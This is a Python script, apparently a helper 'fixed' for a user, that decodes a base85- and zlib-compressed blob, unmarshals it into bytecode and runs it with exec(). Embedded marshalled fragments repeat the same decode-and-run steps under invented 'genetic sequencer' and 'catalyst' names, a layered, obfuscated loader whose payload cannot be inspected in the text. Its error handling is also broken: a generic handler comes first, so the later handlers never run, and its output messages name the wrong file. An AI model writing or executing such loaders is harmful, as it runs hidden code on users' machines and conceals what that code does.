import base64, zlib, marshal, types, sys

blob1 = b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3\x02\x01\x00\x00\x97\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03d\x02Z\x04\x02\x00e\x05d\x03\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x05d\x04\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x04\xab\x01\x00\x00\x00\x00\x00\x00Z\x07\x02\x00e\x01j\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x07\xab\x01\x00\x00\x00\x00\x00\x00Z\t\x02\x00e\x02j\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\t\xab\x01\x00\x00\x00\x00\x00\x00Z\x0b\x02\x00e\x05d\x05\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x03j\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x0b\x02\x00e\r\xab\x00\x00\x00\x00\x00\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00Z\x0e\x02\x00e\x0e\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00y\x01)\x06\xe9\x00\x00\x00\x00Ns\xac\x08\x00\x00"
blob2 = b"c$|e+O>7&-6`m!Rzak~llE|2<;!(^*VQn#qEH||xE2b$*W=zw8NW~2mgIMj3sFjzy%<NJQ84^$vqeTG&mC+yhlE677j-8)F4nD>~?<GqL64olvBs$bZ4{qE;{|=p@M4Abeb^*>CzIprJ_rCXLX1@k)54$HHULnIe5P-l)Ahj!*6w{D~l%XMwDPu#jDYhX^DN{q5Q|5-Wq%1@lBx}}|vN1p~UI8h)0U&nS13Dg}x8K^E-(q$p0}4!ly-%m{0Hd>^+3*<O{*s0K-lk|}BLHWKJweQrNz5{%F-;@E_{d+ImTl7-o7&}O{%uba)w1RL*UARX*79t+0<^B?zmlODX9|2bzp_ztwjy_TdKb)1%eP4d-Xti0Ygjk_%w!^%1xuMNv4Z8&(*Ue7_^Fby1n3;+G<VDAfqi^h1>0@=Eki5!M~rms%afx`+uxa0*;FzudpqNln5M<@!OqndZ)R<vh4u&gpmmnaMewbT0RJby?(fa7XW#r>ZQ4UE&u|~lZsEY~-lpfWMf0_+pV-H`PXInpwmyo~mZ`tfUK?($KHa%mvNlovZ;Y)D+e6uw+mY6LNB2Y9&akbWpZ@lh=Si<!J@t|CG86E`)jp!l4xEY(h7@$llA4}B9dpL*j)eL{vVcbyMx5_{b13)N@wa~epS8Zfo&V_Y#fM*g9;@6%j=%i%WB0=QS3ewj@0~B!iibu<MqrrJIH{m&FoAGB3#0Nf;x!~dvQ|9#3c})IL6kEvhByJvA{B9%UqX0Tg*-+Ak~NW&RJbB?a6weENW&rzRi2ZB!647HWlA^rG4gvj3Yteo30&*};59;7nJF7eh7vjEXwwxPWWzD*3<IvZS#lIL(l*?u$;EGifKfLDpVb*rXLyw!AP~ZT^-S=4X{31tqe<O1kwG$gBZnu8eva3~6;4CxrcH1{Qg{M;GT5@Bdqt%s{xkT;DyaBk)v>cTr#=XM@cQ-VZZJ1azh{1Df~fwf(mdYk_cEC``#zrevUuf1-I7DHKqx9c7Me?*iNur9a3~o)A1AmHbK!6#k<d+QmXjoUlrAc=R-8EfEvn$TP%?Zb2%`-;wF2Z7c~Qh!QUp%@F7d(Q;It@nl31iwc^NCTTrj*OW)bEH>BYlQ$YmihSV2QDxrCsKNToEmsNif~;-ILG+l$@~sMDcnEHYIbjb?L-swo%>NNY60QJ5`2LX(&$CFf*W(cl7t80939@QH+>;!kK4jMTiOQA}zM@dS+wmk4?RtsqIs(NtuZr(Ewj<zxXaVots!6<}UP5>nNp1gfkes4T*zd{)6h-GF4>NSQO}R*91{c`k!=D-D}baN$1fuVNrUDvGiYVXWYBI456{mCG`ukuZfpN)A<xyb=s}byE(DvZfmpRkvo4CMg+F*3C%f6#?m{g@T4u-G<~mB~wGXg;NVMFDj&f5<)qG1#7xlYdFEQ_jHRu*e&FUmQ1J<Gp}4$xq@yalC(x)S-FIEgQe+IxARLJPRm@DXx&t+<h5L0ORJ<E<cw}6ln6?exLHy}9_dE4pz17oL(~E`{a`E-no7?`5)pDEpNY(-6VaJ?C^<J9(GN!A;n`PTPDZBE;WN>5k=ams`uyy<xmZYd@Og|04{1U(*1PGLR>h3WX?aZWQf~69?j-FsmL^GvInrgidoM2}r1u&}XB+q}oGg-NR#n^X*4uqBy?1qY$4<jzMBhXA);zPfx3*xU!VW$#fFa&MCOfRHVn0%6k8aaRw9dY?)7!uP!nGHEb#k+JxY|2h>kX{N{%!`IfvPX|S@e!nA3Iy~#cKVr)%cFx{mYSGj9h1H_Q6edkhuGk)3Z9gWp`~mJzG74m7(!J^o(!2de`mO?3IDzcV;$RQ`@foiYHlj%{3;+>#iT|K>v-`YH)PTx#fRu(|@AsKT#P^)cna!|9sUyU-MtAxP}M>w|Cc1s4_KI9hlp2y|UAEJ$C2$4Oh6~@uj-!Y-5tEyI$Y%KECN4u6l<*?fcwR_fD^|+djDIJ5u!>A&1N9itm{<3o-un;-)89^#pIPd{VwyzH_1WOyqZ$H)k$XXD-xcUafgjb=N#i!+Onn-Tj-cEob+(!(BOWa>FtC;21DH{%^IHo=c%;r;jstN15qS_U^F=Ab$c5Oh5W?fY!%^vdXfE>5Yf!rHF^<aF`B*be*L=(CF(%-E<?)%b0$BJ)|f2ZjG%ISw+Z8XcC`j+)bpk<79YXWEkdaV7mwG_kiObaNYym&C&ix(EpA7N#?}|aRxAsRm;!2e%e)a4AvZnHUPvwCa?b&OiHooz%"
blob3 = b"--- Calibrating Genetic Sequencer ---z\x1fDecoding catalyst DNA strand...z\x1eSynthesizing Catalyst Serum...)\x0f\xda\x06base64\xda\x04zlib\xda\x07marshal\xda\x05types\xda\x17encoded_catalyst_strand\xda\x05print\xda\tb85decode\xda\x13compressed_catalyst\xda\ndecompress\xda\x17marshalled_genetic_code\xda\x05loads\xda\x14catalyst_code_object\xda\x0cFunctionType\xda\x07globals\xda\x1bcatalyst_injection_function\xa9\x00\xf3\x00\x00\x00\x00\xfa\x13<genetic_sequencer>\xda\x08<module>r\x15\x00\x00\x00\x01\x00\x00\x00s\x8f\x00\x00\x00\xf0\x03\x01\x01\x01\xe3\x00\r\xdb\x00\x0b\xdb\x00\x0e\xdb\x00\x0c\xf0\x06\x00\x1bJ#\xd0\x00\x17\xe1\x00\x05\xd0\x06-\xd4\x00.\xd9\x00\x05\xd0\x06'\xd4\x00(\xd8\x16&\x90f\xd7\x16&\xd1\x16&\xd0'>\xd3\x16?\xd0\x00\x13\xd8\x1a)\x98$\x9f/\x99/\xd0*=\xd3\x1a>\xd0\x00\x17\xd8\x17$\x90w\x97}\x91}\xd0%<\xd3\x17=\xd0\x00\x14\xe1\x00\x05\xd0\x06&\xd4\x00'\xf0\x06\x00\x1f1\x98e\xd7\x1e0\xd1\x1e0\xd01E\xc1w\xc3y\xd3\x1eQ\xd0\x00\x1b\xf1\x06\x00\x01\x1c\xd5\x00\x1dr\x13\x00\x00\x00"

decoded = base64.b85decode(blob2)

decompressed = zlib.decompress(decoded)

# The following lines are now **obsolete** for execution, 
# as they created the invalid concatenated blob.
# totalblob = blob1 + decompressed + blob3
# totalblobcom = compressedblob1 + decoded + compressedblob3
# totalblobdecom = zlib.decompress(totalblobcom)

# --- Execution Fix ---
combined_blob = b''.join([blob1, decompressed, blob3])

try:
    # Load the marshalled code object from the decompressed payload
    code_obj = marshal.loads(decompressed)

    # For safety, ensure it's a code object
    if not isinstance(code_obj, types.CodeType):
        print("❌ Error: Decompressed payload is not a valid Python code object.")
        sys.exit(1)

    # 3. Create a global execution environment
    # Note: The original code does not explicitly define a globals dict for exec,
    # so we'll use a basic dictionary.
    execution_globals = {
        'base64': base64, 'zlib': zlib, 'marshal': marshal, 
        'print': print, '__builtins__': __builtins__
        # The payload will likely try to import or look up its dependencies
    }

    # 4. Execute the code object
    # Executing the code object in the created global environment
    print(decompressed)
    print(code_obj)
    print("\n🔬 Executing decompressed genetic code payload...")
    exec(code_obj, execution_globals)
    print("✅ Payload execution complete.")
except Exception as e:
    print(f"\n❌  Error: {e}")
except zlib.error as e:
    print(f"\n❌ Zlib Decompression Error: {e}")
except EOFError as e:
    print(f"\n❌ Marshal Loading Error (EOF): {e}. This likely means the payload is corrupted or was split incorrectly.")
except Exception as e:
    print(f"\n❌ An error occurred during execution: {e}")

# --- File Write (Kept as in original code) ---
# The original script saves the concatenated blob which caused the execution error.
# We will save the valid code object for inspection instead.

try:
    # If the execution succeeded, the code_obj should be available.
    if 'code_obj' in locals():
        with open("chimera_payload_fixed.pyc", "wb") as f:
            # We must prefix the code object with the correct magic number and timestamp
            # to make a valid .pyc file, but since we don't know the Python version
            # or source code, we'll just save the raw marshal object for inspection.
            f.write(decompressed) 
            print("\n✅ Wrote decompressed code object to chimera_payload_fixed.marshal for inspection.")
    else:
        # If we failed to load/execute, write the original full concatenation as the user requested
        totalblob = blob1 + decompressed + blob3
        with open("chimera_payload4_original_concat.bin", "wb") as f:
             f.write(totalblob)
        print("\n⚠️ Execution failed. Wrote the original, concatenated blob to chimera_payload4_original_concat.bin.")


except Exception as e:
     print(f"❌ Error writing output file: {e}")